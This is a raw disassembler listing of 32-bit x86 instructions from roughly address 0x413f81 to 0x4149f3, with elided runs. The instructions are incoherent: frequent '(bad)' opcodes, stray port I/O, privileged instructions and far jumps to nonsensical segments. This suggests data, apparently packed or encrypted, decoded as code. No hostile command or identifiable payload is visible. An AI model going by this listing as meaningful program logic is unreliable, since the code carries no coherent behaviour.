  413f81:	pusha  
  413f82:	cmc    
  413f83:	sub    BYTE PTR [ebx-0x76182dfa],ch
  413f89:	iret   
  413f8a:	xor    edi,0x10
  413f8d:	cmp    dl,BYTE PTR [ebx+0x64]
  413f90:	jl     0x413f75
  413f92:	sub    DWORD PTR [esi-0x2691daca],ebx
  413f98:	mov    cl,0x79
  413f9a:	lods   eax,DWORD PTR ds:[esi]
  413f9b:	scas   al,BYTE PTR es:[edi]
  413f9c:	test   BYTE PTR [edx-0x35],cl
  413f9f:	test   BYTE PTR [edx],bl
  413fa1:	or     ebx,DWORD PTR [esi-0x1]
  413fa4:	add    bh,cl
  413fa6:	jne    0x414025
  413fa8:	sahf   
  413fa9:	fs icebp 
  413fab:	cmp    edx,DWORD PTR [esi-0x64f45455]
  413fb1:	xlat   BYTE PTR ds:[ebx]
  413fb2:	std    
  413fb3:	addr16 (bad) 
  413fb5:	fwait
  413fb6:	ins    BYTE PTR es:[edi],dx
  413fb7:	jmp    0x413fa9
  413fb9:	lea    esi,[esi-0x3d]
  413fbc:	mov    ch,0x82
  413fbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fbf:	call   0x8defc842
  413fc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fc5:	adc    DWORD PTR [ecx-0x8],0x7086b1b6
  413fcc:	dec    edi
  413fcd:	ds cmp eax,0x39e529b1
  413fd3:	cmp    ecx,DWORD PTR [edi-0x504832ea]
  413fd9:	and    al,0x30
  413fdb:	dec    esp
  413fdc:	add    eax,0x8ae62cf
  413fe1:	pop    ebp
  413fe2:	shr    BYTE PTR [ecx],cl
  413fe4:	mov    eax,ds:0xd67d34a6
  413fe9:	repz imul esp,DWORD PTR [ebx+eax*4],0x5d
  413fee:	rol    DWORD PTR [edx-0x66],1
  413ff1:	loopne 0x413fad
  413ff3:	push   ebp
  413ff4:	dec    ebp
  413ff5:	mov    edx,0x41da8f32
  413ffa:	or     esi,edi
  413ffc:	icebp  
  413ffd:	sub    ah,BYTE PTR [ecx+0x120b8af9]
  414003:	ins    DWORD PTR es:[edi],dx
  414004:	sbb    edx,DWORD PTR [bx]
  414007:	out    dx,al
  414008:	in     al,dx
  414009:	(bad)  
  41400a:	popf   
  41400b:	inc    edx
  41400c:	xor    al,0x7b
  41400e:	retf   
  41400f:	dec    ebx
  414010:	mov    al,ds:0x4c54d64d
  414015:	jle    0x414005
  414017:	adc    BYTE PTR [ebx],ch
  414019:	inc    ecx
  41401a:	in     al,dx
  41401b:	mov    esp,0x5b026f9e
  414020:	imul   ecx,DWORD PTR [edx-0x1ed41905],0xffffffbe
  414027:	xchg   DWORD PTR [ecx],edi
  414029:	ja     0x414098
  41402b:	xchg   edx,eax
  41402c:	and    BYTE PTR [ebp+0xa],al
  41402f:	pop    ss
  414030:	cmp    BYTE PTR [eax],ah
  414032:	and    dh,BYTE PTR [ebp-0x1b3f8538]
  414038:	test   al,0x8b
  41403a:	scas   eax,DWORD PTR es:[edi]
  41403b:	xchg   ebp,eax
  41403c:	sub    al,0x4a
  41403e:	or     eax,ecx
  414040:	test   BYTE PTR [ebp+0x6e],ch
  414043:	cwde   
  414044:	arpl   WORD PTR [ecx+0x1a],bp
  414047:	mov    esi,0xc3427a77
  41404c:	jmp    0x1512:0xda5d8f8e
  414053:	fild   WORD PTR [edx+eax*1]
  414056:	loop   0x4140b1
  414058:	(bad)  
  414059:	sbb    DWORD PTR [edx+0x7d],edi
  41405c:	scas   al,BYTE PTR es:[edi]
  41405d:	adc    BYTE PTR [edx-0x2],bl
  414060:	cld    
  414061:	jmp    0x2a2c:0x41671b3e
  414068:	add    DWORD PTR [ebp+0x4057ad54],0x0
	...
  4140d6:	pop    edx
  4140d7:	ficom  DWORD PTR [esi+0x60]
  4140da:	(bad)  
  4140db:	in     al,dx
  4140dc:	jle    0x4140d8
  4140de:	call   0x1feb:0x7d52e96
  4140e5:	mov    bh,0x67
  4140e7:	fadd   DWORD PTR [eax]
  4140e9:	add    BYTE PTR [eax],al
  4140eb:	add    DWORD PTR [eax],eax
  4140ed:	add    ah,dh
  4140ef:	jg     0x414076
  4140f1:	dec    edx
  4140f2:	xchg   BYTE PTR ds:0xd144651c,dl
  4140f8:	pusha  
  4140f9:	mov    edi,0xaafc0685
  4140fe:	fnstcw WORD PTR [edx+0x44]
  414101:	jg     0x4140c6
  414103:	xchg   ecx,eax
  414104:	sub    al,0xc9
  414106:	mov    ch,0x95
  414108:	or     eax,0x7b563a2e
  41410d:	xlat   BYTE PTR ds:[ebx]
  41410e:	sub    eax,0xb7029ef1
  414113:	xchg   edi,eax
  414114:	dec    ecx
  414115:	mov    DWORD PTR [eax],ecx
  414117:	or     al,0xb7
  414119:	int3   
  41411a:	aam    0xfa
  41411c:	mov    esp,0xf3753803
  414121:	cmc    
  414122:	iret   
  414123:	xor    eax,esi
  414125:	fidiv  DWORD PTR [edx]
  414127:	test   BYTE PTR [eax-0x3a2e7534],bl
  41412d:	addr16 jns 0x414174
  414130:	jle    0x4140f4
  414132:	xchg   ecx,eax
  414133:	jb     0x414117
  414135:	or     al,0x42
  414137:	mov    dh,0xb5
  414139:	ins    DWORD PTR es:[edi],dx
  41413a:	pop    edx
  41413b:	lahf   
  41413c:	mov    al,0x3e
  41413e:	and    bh,BYTE PTR [ebp+esi*1-0x1b]
  414142:	icebp  
  414143:	or     cl,BYTE PTR [edi-0x38f776e1]
  414149:	xor    dh,BYTE PTR [ebp+0x40bf6369]
  41414f:	pop    esi
  414150:	mov    al,0x2d
  414152:	fs (bad) 
  414154:	icebp  
  414155:	dec    ecx
  414156:	repz out dx,eax
  414158:	pop    ebp
  414159:	or     al,0x62
  41415b:	or     ch,bl
  41415d:	fsubr  DWORD PTR [edi]
  41415f:	ror    DWORD PTR [eax],cl
  414161:	xchg   esi,eax
  414162:	jb     0x4141a0
  414164:	adc    BYTE PTR [eax+0x6bb76052],bl
  41416a:	daa    
  41416b:	shl    BYTE PTR [eax+0x18ed19b1],0x17
  414172:	lods   al,BYTE PTR ds:[esi]
  414173:	pop    eax
  414174:	or     bl,BYTE PTR [ebx]
  414176:	cwde   
  414177:	(bad)  
  414178:	nop
  414179:	cmp    DWORD PTR [esi-0x35],0x3a01106
  414180:	sub    DWORD PTR [edx+0x24],ebp
  414183:	pop    ecx
  414184:	out    dx,eax
  414185:	cmp    edi,DWORD PTR [edx+ebp*1]
  414188:	inc    ecx
  414189:	daa    
  41418a:	aaa    
  41418b:	cld    
  41418c:	xor    DWORD PTR [ebp+0x5b],ebx
  41418f:	jnp    0x41413a
  414191:	ror    BYTE PTR [edx+0x20],0x6b
  414195:	rcr    DWORD PTR [eax+0x4a],cl
  414198:	adc    al,0xf
  41419a:	cmp    BYTE PTR [esi-0x37ac5db6],0xd5
  4141a1:	das    
  4141a2:	fsub   DWORD PTR [ebx]
  4141a4:	mov    eax,ds:0x9212da31
  4141a9:	inc    eax
  4141aa:	jno    0x41419d
  4141ac:	out    dx,al
  4141ad:	inc    DWORD PTR [ebx-0x52]
  4141b0:	sahf   
  4141b1:	xor    bh,BYTE PTR [edi-0x1]
  4141b4:	push   ecx
  4141b5:	out    0x2a,eax
  4141b7:	int    0x26
  4141b9:	sbb    cl,al
  4141bb:	popf   
  4141bc:	push   ss
  4141bd:	and    eax,0x554ee8b4
  4141c2:	cs cld 
  4141c4:	sbb    ecx,DWORD PTR [edi+0x4525d2f]
  4141ca:	mov    DWORD PTR [ebp+eax*4+0x60527a9d],ebp
  4141d1:	xchg   edx,eax
  4141d2:	div    BYTE PTR [esi-0x323d3ea5]
  4141d8:	xchg   edi,eax
  4141d9:	sub    eax,ebp
  4141db:	shl    DWORD PTR [ecx+eiz*1+0x2fb5921a],1
  4141e2:	sbb    cl,BYTE PTR [edi-0x6e]
  4141e5:	add    bl,bl
  4141e7:	add    al,dh
  4141e9:	popf   
  4141ea:	aaa    
  4141eb:	(bad)  
  4141ec:	sbb    dl,BYTE PTR [eax+eax*1]
	...
  414253:	add    BYTE PTR [eax],al
  414255:	add    BYTE PTR [edx],al
  414257:	adc    al,BYTE PTR [ecx]
  414259:	mov    ds:0xb3a2b311,eax
  41425e:	mov    DWORD PTR [ecx+0x37],edx
  414261:	push   edi
  414262:	test   DWORD PTR [ebp-0x26985311],edi
  414268:	add    BYTE PTR [eax],al
  41426a:	add    BYTE PTR [ecx],al
  41426c:	add    BYTE PTR [eax],al
  41426e:	ja     0x414277
  414270:	ret    
  414271:	sbb    eax,0x8152d4a4
  414276:	(bad)
  41427a:	pop    edx
  41427b:	ins    DWORD PTR es:[edi],dx
  41427c:	fs mov edx,0xd0ead5ac
  414282:	xchg   esi,eax
  414283:	jno    0x41421f
  414285:	dec    eax
  414286:	fisubr WORD PTR [esi-0x9]
  414289:	jo     0x414228
  41428b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41428c:	jmp    0x6e2d6279
  414291:	aad    0xe3
  414293:	test   BYTE PTR [eax-0x33],dh
  414296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414297:	and    DWORD PTR [ebx-0x2d8f7172],edx
  41429d:	xor    eax,0x568e72a7
  4142a2:	idiv   DWORD PTR [esi+0x2a6f617c]
  4142a8:	pop    edx
  4142a9:	xchg   esp,eax
  4142aa:	fisttp DWORD PTR [eax+eax*4-0x1898cbbc]
  4142b1:	(bad)  
  4142b2:	popa   
  4142b3:	sub    esp,esi
  4142b5:	retf   0xe56d
  4142b8:	mov    cl,0xab
  4142ba:	xchg   esp,eax
  4142bb:	sub    esp,DWORD PTR [eax]
  4142bd:	and    DWORD PTR [edi-0x336bdf0],esi
  4142c3:	xchg   esp,eax
  4142c4:	add    edi,DWORD PTR [si-0x7]
  4142c8:	out    0xae,eax
  4142ca:	xchg   ebx,eax
  4142cb:	sbb    eax,0xacbe0ce8
  4142d0:	scas   al,BYTE PTR es:[edi]
  4142d1:	jmp    0x305822f9
  4142d6:	imul   esp,edx,0x778256b0
  4142dc:	xor    esi,ebp
  4142de:	pop    edx
  4142df:	mov    ebx,0x136274d
  4142e4:	rcr    DWORD PTR [ebp+0x7f34b9db],1
  4142ea:	outs   dx,DWORD PTR ds:[esi]
  4142eb:	outs   dx,BYTE PTR ds:[esi]
  4142ec:	mov    DWORD PTR [esp+eax*2],0xabaa6ac0
  4142f3:	(bad)  
  4142f4:	push   es
  4142f5:	pop    edi
  4142f6:	std    
  4142f7:	inc    esp
  4142f8:	pop    es
  4142f9:	retf   
  4142fa:	cmp    al,0xb3
  4142fc:	sti    
  4142fd:	(bad)  
  4142ff:	sub    al,0x22
  414301:	shl    DWORD PTR [eax+0x4b],0xef
  414305:	mov    edx,0x341d7e80
  41430a:	add    al,BYTE PTR [edx-0x681a9fcb]
  414310:	pop    ds
  414311:	inc    esp
  414312:	push   cs
  414313:	repz mov WORD PTR [edx+esi*1-0x45d505ca],fs
  41431b:	daa    
  41431c:	inc    DWORD PTR [ebp-0x45]
  41431f:	pop    ebx
  414320:	out    0x2d,eax
  414322:	mov    ah,0xaa
  414324:	pop    ebp
  414325:	pushf  
  414326:	push   eax
  414327:	dec    ebp
  414328:	les    edi,FWORD PTR [eax+0x78f5e618]
  41432e:	stc    
  41432f:	imul   edx,DWORD PTR [esi+eax*8+0x12],0x3a
  414334:	jmp    0x41435c
  414336:	popf   
  414337:	out    dx,al
  414338:	sbb    DWORD PTR [eax+eiz*2],esi
  41433b:	jmp    0x22c1:0x1e789886
  414342:	hlt    
  414343:	xlat   BYTE PTR ds:[ebx]
  414344:	int    0x8c
  414346:	sbb    eax,0xb3e056b9
  41434b:	adc    cl,BYTE PTR [ebp+0x25]
  41434e:	pop    ds
  41434f:	cs mov bl,0xeb
  414352:	adc    BYTE PTR [eax-0x61],dh
  414355:	(bad)  
  414356:	pop    ds
  414357:	retf   0xa3f6
  41435a:	mov    dl,0xaf
  41435c:	in     eax,0xe2
  41435e:	xchg   BYTE PTR [esi],dl
  414360:	jl     0x414322
  414362:	lods   al,BYTE PTR ds:[esi]
  414363:	clc    
  414364:	out    dx,al
  414365:	cmc    
  414366:	pushf  
  414367:	cmp    BYTE PTR [edx-0x6],dl
  41436a:	mov    eax,ds:0x104d8a
	...
  4143d3:	add    BYTE PTR [eax],al
  4143d5:	add    BYTE PTR [ecx],al
  4143d7:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  4143de:	rol    DWORD PTR [ebp+0x5e],0xa1
  4143e2:	stc    
  4143e3:	sub    al,0xa1
  4143e5:	inc    esp
  4143e6:	fiadd  DWORD PTR [bx+si]
  4143e9:	add    BYTE PTR [eax],al
  4143eb:	add    DWORD PTR [eax],eax
  4143ed:	add    bh,bh
  4143ef:	or     DWORD PTR [ebp-0x53b10326],ebx
  4143f5:	out    0xc7,al
  4143f7:	shl    ecx,1
  4143f9:	sar    BYTE PTR [edx+0x1c],cl
  4143fc:	and    al,BYTE PTR [ebp+ebp*4+0x3d]
  414400:	in     eax,dx
  414401:	push   esp
  414402:	adc    ecx,esi
  414404:	outs   dx,BYTE PTR ds:[esi]
  414405:	repnz mov ds:0x1a673faf,al
  41440b:	rol    BYTE PTR [eax+0x7293ceaa],cl
  414411:	add    al,0x43
  414413:	clc    
  414414:	cmp    bh,BYTE PTR [esi]
  414416:	add    al,0xed
  414418:	ja     0x41447d
  41441a:	and    ch,BYTE PTR [edx+0xd671266]
  414420:	loop   0x4143f4
  414422:	lock push edx
  414424:	in     eax,dx
  414425:	es cmc 
  414427:	pop    es
  414428:	xor    cl,BYTE PTR [ecx+0x63f3d070]
  41442e:	cli    
  41442f:	cmp    eax,0x2ad0944f
  414434:	mov    cs,edi
  414436:	rol    al,0xf
  414439:	xchg   edx,eax
  41443a:	mov    ah,0x58
  41443c:	dec    ebp
  41443d:	mov    ch,0x0
  41443f:	and    al,0xa0
  414441:	lahf   
  414442:	rcl    dl,0x52
  414445:	(bad)  
  414446:	mov    ecx,0xad64fbbd
  41444b:	fidiv  WORD PTR [edx-0x58]
  41444e:	add    ecx,DWORD PTR [ecx-0x65]
  414451:	sbb    al,0xae
  414453:	pop    ds
  414454:	data16 je 0x41441c
  414457:	fisttp WORD PTR [ebx]
  414459:	js     0x41441e
  41445b:	or     ebp,DWORD PTR [esp+eiz*8+0x6a3ee65a]
  414462:	cld    
  414463:	sub    dh,BYTE PTR ds:0x203c4a9a
  414469:	vmread DWORD PTR [ebp-0x19ce5448],ebp
  414470:	dec    ebx
  414471:	ror    DWORD PTR [ebp-0x40],cl
  414474:	adc    ecx,DWORD PTR [esi+esi*4]
  414477:	lahf   
  414478:	imul   eax,DWORD PTR [eax+0x5a018a10],0x7f
  41447f:	je     0x414449
  414481:	xchg   DWORD PTR [edx+ecx*2+0xf],ecx
  414485:	ret    0x3ed6
  414488:	push   ecx
  414489:	mov    BYTE PTR [ebx-0x4bae296f],cl
  41448f:	pop    eax
  414490:	dec    esp
  414491:	mov    WORD PTR [eax+0x49fbae2a],fs
  414497:	xchg   edx,eax
  414498:	shl    DWORD PTR [edi-0x12],0x79
  41449c:	mov    ah,0x7b
  41449e:	daa    
  41449f:	add    DWORD PTR [esi+ebx*2-0x2d],ebp
  4144a3:	loope  0x414504
  4144a5:	and    BYTE PTR [ebx-0x2a5f4b41],ah
  4144ab:	mov    edi,0x8657de14
  4144b0:	in     eax,dx
  4144b1:	mov    bl,0xbc
  4144b3:	mov    bl,0x9b
  4144b5:	mov    ch,al
  4144b7:	mov    ah,0x1e
  4144b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144ba:	cs (bad) 
  4144bc:	xchg   ecx,eax
  4144bd:	or     bh,dl
  4144bf:	cmp    esi,eax
  4144c1:	adc    BYTE PTR [eax+0x43],dh
  4144c4:	rcr    esi,0x9a
  4144c7:	push   es
  4144c8:	pop    ss
  4144c9:	mov    edx,0xbe5e88ce
  4144ce:	sbb    DWORD PTR [edx],eax
  4144d0:	fisubr WORD PTR gs:[ebp-0x2c72d124]
  4144d7:	outs   dx,BYTE PTR ds:[esi]
  4144d8:	ins    DWORD PTR es:[edi],dx
  4144d9:	fbld   TBYTE PTR [esi+0x46f14199]
  4144df:	pop    edx
  4144e0:	ja     0x41454a
  4144e2:	fisubr DWORD PTR [ebp-0x16]
  4144e5:	popf   
  4144e6:	push   ds
  4144e7:	push   edx
  4144e8:	lahf   
  4144e9:	mov    cx,0x3658
  4144ed:	retf   0x0
	...
  414554:	add    BYTE PTR [eax],al
  414556:	pop    ebx
  414557:	jae    0x41459b
  414559:	or     eax,0x775f3d6a
  41455e:	pop    ds
  41455f:	dec    edi
  414560:	or     cl,BYTE PTR [esi+0x68]
  414563:	and    dl,BYTE PTR [esi-0x52]
  414566:	fild   DWORD PTR [bx+si]
  414569:	add    BYTE PTR [eax],al
  41456b:	add    DWORD PTR [eax],eax
  41456d:	add    BYTE PTR [edi+edx*8+0x1e],dh
  414571:	mov    ebp,0xfb92c35a
  414576:	bound  ecx,QWORD PTR [edi-0x3c]
  414579:	out    dx,al
  41457a:	dec    esi
  41457b:	sti    
  41457c:	data16 daa 
  41457e:	mov    al,0x8c
  414580:	mov    dl,0xc1
  414582:	popa   
  414583:	imul   ebx,DWORD PTR [edx+0x4f347a6a],0xffffffa6
  41458a:	scas   al,BYTE PTR es:[edi]
  41458b:	fild   WORD PTR [ebx]
  41458d:	lods   eax,DWORD PTR ds:[esi]
  41458e:	or     ecx,DWORD PTR [ecx-0xdc83fcd]
  414594:	(bad)  
  414595:	or     bl,BYTE PTR [ebx]
  414597:	ins    BYTE PTR es:[edi],dx
  414598:	repnz (bad) 
  41459a:	stos   DWORD PTR es:[edi],eax
  41459b:	mov    dh,0x87
  41459d:	lahf   
  41459e:	dec    edi
  41459f:	loopne 0x414570
  4145a1:	out    dx,al
  4145a2:	mov    ah,0x41
  4145a4:	in     al,0x4b
  4145a6:	pop    eax
  4145a7:	sub    al,0x55
  4145a9:	mov    cl,0xd9
  4145ab:	stc    
  4145ac:	adc    DWORD PTR ds:0xf861825e,esi
  4145b2:	stos   DWORD PTR es:[edi],eax
  4145b3:	jecxz  0x414600
  4145b5:	out    dx,al
  4145b6:	mov    ebp,DWORD PTR [eax+edx*2+0x5c2f4bf6]
  4145bd:	push   es
  4145be:	or     eax,0x57afa639
  4145c3:	push   ebx
  4145c4:	je     0x4145a9
  4145c6:	pusha  
  4145c7:	jmp    0xd9a5511a
  4145cc:	cs aam 0xbd
  4145cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145d0:	fisttp WORD PTR [edx+0x7f]
  4145d3:	sbb    BYTE PTR [eax-0x7e],bh
  4145d6:	arpl   WORD PTR [eax+ebp*2],bp
  4145d9:	jge    0x4145de
  4145db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145dc:	inc    edx
  4145dd:	sbb    edi,DWORD PTR [eax-0xa]
  4145e0:	mov    edi,0xf20ff684
  4145e5:	xchg   bh,dh
  4145e7:	adc    BYTE PTR [edi+0x65],bh
  4145ea:	fwait
  4145eb:	rcl    BYTE PTR [esi-0x61],cl
  4145ee:	jle    0x414647
  4145f0:	inc    edx
  4145f1:	in     eax,0x88
  4145f3:	cli    
  4145f4:	mov    dh,0xdb
  4145f6:	mov    ebx,0xff17bcda
  4145fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145fc:	ret    
  4145fd:	call   0xec86:0x9d96eb5a
  414604:	push   0xa3d69a71
  414609:	push   esi
  41460a:	int3   
  41460b:	mov    edx,0x663f4e42
  414610:	xor    DWORD PTR [edx-0x23],ecx
  414613:	push   ebx
  414614:	and    eax,0xac619901
  414619:	xor    eax,0x2a964a9b
  41461e:	out    dx,eax
  41461f:	mov    eax,ds:0x91a226b
  414624:	out    0x16,al
  414626:	sub    BYTE PTR [edi],dh
  414628:	gs test eax,0x46f0932d
  41462e:	push   ebp
  41462f:	repnz imul ebp,DWORD PTR [esp+ebx*1],0xfe564f95
  414637:	test   al,0x59
  414639:	cld    
  41463a:	in     al,0xd3
  41463c:	push   eax
  41463d:	sub    BYTE PTR [edi+0x79],0xa8
  414641:	retf   
  414642:	scas   al,BYTE PTR es:[edi]
  414643:	xor    DWORD PTR [ebp+0x73],0xffffff9e
  414647:	rol    BYTE PTR [ebp-0x49],0xc1
  41464b:	dec    esi
  41464c:	out    dx,eax
  41464d:	mov    ebp,0x34ecd4eb
  414652:	int    0x88
  414654:	add    BYTE PTR [ebp+0x50],dh
  414657:	push   0xffffff9f
  414659:	sub    al,0xc2
  41465b:	xchg   edx,eax
  41465c:	or     edi,ebp
  41465e:	test   eax,0xea380bab
  414663:	mov    al,ds:0x36837ed9
  414668:	stos   BYTE PTR es:[edi],al
  414669:	jmp    0x0:0xe02ca295
	...
  4146d4:	add    BYTE PTR [eax],al
  4146d6:	jg     0x414736
  4146d8:	cmc    
  4146d9:	ins    DWORD PTR es:[edi],dx
  4146da:	cmc    
  4146db:	out    dx,eax
  4146dc:	call   FWORD PTR [esi+0x17]
  4146df:	enter  0xab7a,0x81
  4146e3:	push   esi
  4146e4:	inc    ebx
  4146e5:	and    BYTE PTR [edi-0x24],0x0
  4146e9:	add    BYTE PTR [eax],al
  4146eb:	add    DWORD PTR [eax],eax
  4146ed:	add    BYTE PTR [edx+0x1c],al
  4146f0:	jns    0x414673
  4146f2:	adc    BYTE PTR [edx-0x635a4a82],0xef
  4146f9:	jmp    0x9f4b56ca
  4146fe:	add    ebx,DWORD PTR [eax-0x4719f4a7]
  414704:	push   0xffffff89
  414706:	jmp    0x4146cc
  414708:	(bad)  
  414709:	adc    al,0x4b
  41470b:	lea    eax,[ebp-0x42]
  41470e:	nop    DWORD PTR [edi+0x51]
  414712:	hlt    
  414713:	ins    BYTE PTR es:[edi],dx
  414714:	repnz pop edx
  414716:	xchg   edx,eax
  414717:	aad    0x7d
  414719:	cmc    
  41471a:	bound  eax,QWORD PTR [ebx]
  41471c:	inc    eax
  41471d:	sbb    eax,0x68bba0e8
  414722:	mov    dl,0xe7
  414724:	repz cwde 
  414726:	jo     0x4146c8
  414728:	xchg   ecx,eax
  414729:	cmp    cl,BYTE PTR [ebx+0x4c6be6b9]
  41472f:	mov    al,0x6f
  414731:	adc    DWORD PTR [ebx],0x64
  414734:	aas    
  414735:	inc    esi
  414736:	pop    esp
  414737:	and    bl,BYTE PTR [esi+0x141bdb46]
  41473d:	xchg   BYTE PTR [eax+ebx*2-0x1e17931c],bh
  414744:	push   ds
  414745:	jecxz  0x41475d
  414747:	nop
  414748:	xor    al,0x82
  41474a:	lahf   
  41474b:	fwait
  41474c:	dec    edi
  41474d:	mov    ebx,0xe14bb3d4
  414752:	push   edx
  414753:	xor    al,0x94
  414755:	adc    eax,edi
  414757:	lahf   
  414758:	(bad)  
  41475a:	mov    DWORD PTR fs:[ecx],ebx
  41475d:	ja     0x414717
  41475f:	sbb    bl,BYTE PTR [edx]
  414761:	sbb    al,BYTE PTR [esi]
  414763:	aam    0xc1
  414765:	cmp    edi,DWORD PTR [ebx-0x7eb6236f]
  41476b:	xchg   eax,esi
  41476d:	jecxz  0x4147b1
  41476f:	popf   
  414770:	lds    edi,FWORD PTR [esi]
  414772:	mov    al,0x4d
  414774:	push   edi
  414775:	inc    ebp
  414776:	jge    0x414767
  414778:	mov    ecx,DWORD PTR [edi-0x39b4f3ba]
  41477e:	push   ebp
  41477f:	mov    eax,0xdc006279
  414784:	ret    0xa97e
  414787:	bnd jns 0x414774
  41478a:	add    edi,edx
  41478c:	rcl    BYTE PTR [eax],cl
  41478e:	mov    ss,WORD PTR [esp+edi*2+0x79]
  414792:	pop    edx
  414793:	mov    al,ds:0xb3850cee
  414798:	add    al,BYTE PTR [esi+0x1247ace3]
  41479e:	mov    edx,0x159a1bcf
  4147a3:	dec    esp
  4147a4:	cld    
  4147a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147a6:	or     al,0x5d
  4147a8:	xchg   ebp,eax
  4147a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147aa:	adc    DWORD PTR [ebp-0x24b636cb],edi
  4147b0:	mov    esi,0xfe7217bf
  4147b5:	xor    BYTE PTR [edi+ecx*4-0x1b],0xe3
  4147ba:	nop
  4147bb:	(bad)  
  4147bc:	bound  edi,QWORD PTR [edx]
  4147be:	and    bl,bh
  4147c0:	jbe    0x41480b
  4147c2:	sti    
  4147c3:	and    esi,DWORD PTR [eax]
  4147c5:	push   0x785d40d2
  4147ca:	pop    es
  4147cb:	ds retf 
  4147cd:	int    0xea
  4147cf:	dec    edx
  4147d0:	pusha  
  4147d1:	daa    
  4147d2:	ret    0x47b1
  4147d5:	jl     0x414771
  4147d7:	jmp    0x4147e3
  4147d9:	mov    ebx,0x8ca750b5
  4147de:	retf   
  4147df:	dec    eax
  4147e0:	nop
  4147e1:	sbb    ch,bh
  4147e3:	popa   
  4147e4:	dec    esi
  4147e5:	mov    ecx,0x8a40b0f5
  4147ea:	add    esp,DWORD PTR [edi+0xcccd]
	...
  414854:	add    BYTE PTR [eax],al
  414856:	jle    0x414887
  414858:	add    DWORD PTR [ebp+0x51],ebp
  41485b:	outs   dx,DWORD PTR ds:[esi]
  41485c:	jle    0x41489d
  41485e:	aas    
  41485f:	mov    BYTE PTR [esi],cl
  414861:	cmp    eax,0x3acca9f7
  414866:	fld    QWORD PTR [bx+si]
  414869:	add    BYTE PTR [eax],al
  41486b:	add    DWORD PTR [eax],eax
  41486d:	add    BYTE PTR [ebx-0x1c748ff9],ah
  414873:	mov    BYTE PTR fs:[ebp-0x3],cl
  414877:	xor    bh,bh
  414879:	test   eax,0x158aead3
  41487e:	loop   0x41487c
  414880:	sbb    al,BYTE PTR [esi+0x2c]
  414883:	and    eax,0xca698495
  414888:	or     edi,0xf5445c00
  41488e:	adc    ecx,ebp
  414890:	push   0xffffff8e
  414892:	dec    edi
  414893:	pop    ss
  414894:	or     ebx,DWORD PTR [esi-0x1c91786b]
  41489a:	sar    ah,cl
  41489c:	cmp    ah,BYTE PTR [esi+0x2f]
  41489f:	and    BYTE PTR [edx],0xcd
  4148a2:	test   DWORD PTR [edx-0xc],esi
  4148a5:	jo     0x4148d7
  4148a7:	pop    esp
  4148a8:	jno    0x414838
  4148aa:	int3   
  4148ab:	push   0xffffffc1
  4148ad:	fdiv   DWORD PTR [edx]
  4148af:	sbb    DWORD PTR [ebp+0x2c],ebp
  4148b2:	adc    al,0xf7
  4148b4:	rcl    BYTE PTR [ebp+0x65702716],cl
  4148ba:	pushf  
  4148bb:	int    0xb9
  4148bd:	inc    ecx
  4148be:	in     al,0x2f
  4148c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148c1:	and    bl,0x4c
  4148c4:	stos   BYTE PTR es:[edi],al
  4148c5:	push   ebp
  4148c6:	dec    DWORD PTR [ebp-0x31]
  4148c9:	cmp    ah,bh
  4148cb:	mov    ebp,0x73cfa416
  4148d0:	aam    0x9b
  4148d2:	sbb    BYTE PTR [ecx-0x6c],dh
  4148d5:	xlat   BYTE PTR ds:[ebx]
  4148d6:	test   bh,dh
  4148d8:	test   eax,0x12fa148e
  4148dd:	ror    BYTE PTR [ecx+eiz*4+0x5ecabfe],1
  4148e4:	loop   0x414962
  4148e6:	cmp    esp,esp
  4148e8:	mov    al,ds:0x10b90723
  4148ed:	pop    ebx
  4148ee:	dec    eax
  4148ef:	test   DWORD PTR [ebp+ecx*2-0x1bb58c64],eax
  4148f6:	xor    ebp,DWORD PTR [edi+edx*8]
  4148f9:	and    DWORD PTR [ebx-0x26],0xffffffbc
  4148fd:	retf   
  4148fe:	aad    0xe3
  414900:	scas   eax,DWORD PTR es:[edi]
  414901:	dec    ebp
  414902:	mov    bh,0x5b
  414904:	mov    esi,0x3efdb257
  414909:	add    dh,BYTE PTR [eax]
  41490b:	push   0x6b2ea29d
  414910:	mov    ah,al
  414912:	iret   
  414913:	lea    edi,[esi]
  414915:	or     esi,DWORD PTR [edx-0x7ea26f8e]
  41491b:	jae    0x4148b4
  41491d:	outs   dx,BYTE PTR ds:[esi]
  41491e:	in     al,dx
  41491f:	mov    ds:0x49d212e2,al
  414924:	aas    
  414925:	lock stos BYTE PTR es:[edi],al
  414927:	outs   dx,DWORD PTR ds:[esi]
  414928:	add    ch,dh
  41492a:	dec    edi
  41492b:	(bad)  
  41492c:	and    eax,0x5413e9f2
  414931:	pop    ebx
  414932:	ja     0x4148d0
  414934:	mov    esi,0xeac1e40c
  414939:	jno    0x4149b5
  41493b:	ret    0xf8da
  41493e:	inc    esi
  41493f:	pop    ebx
  414940:	mov    eax,ds:0x1c975d6b
  414945:	mov    DWORD PTR [ecx+0x296fcdeb],ebx
  41494b:	jmp    0x414979
  41494d:	fsub   QWORD PTR [ebx]
  41494f:	enter  0xcf40,0xf6
  414953:	jle    0x41494b
  414955:	popf   
  414956:	sub    al,0x4b
  414958:	or     BYTE PTR [esi+0x360c2972],ah
  41495e:	xchg   esi,eax
  41495f:	ficomp WORD PTR [edi+ebp*8+0x17035bff]
  414966:	fcmovb st,st(7)
  414968:	enter  0x51ab,0xe5
  41496c:	push   0x46
	...
  4149d5:	add    BYTE PTR [ebx],cl
  4149d7:	jle    0x4149ab
  4149d9:	and    esi,edi
  4149db:	scas   eax,DWORD PTR es:[edi]
  4149dc:	sti    
  4149dd:	jle    0x4149c5
  4149df:	pop    edx
  4149e0:	push   ds
  4149e1:	pop    es
  4149e2:	(bad)  
  4149e3:	xor    BYTE PTR [edi+0xde67e8],al
  4149e9:	add    BYTE PTR [eax],al
  4149eb:	add    DWORD PTR [eax],eax
  4149ed:	add    dh,bl
  4149ef:	fstp   DWORD PTR [ecx-0x2f]
  4149f2:	push   esi
  4149f3:	popa   
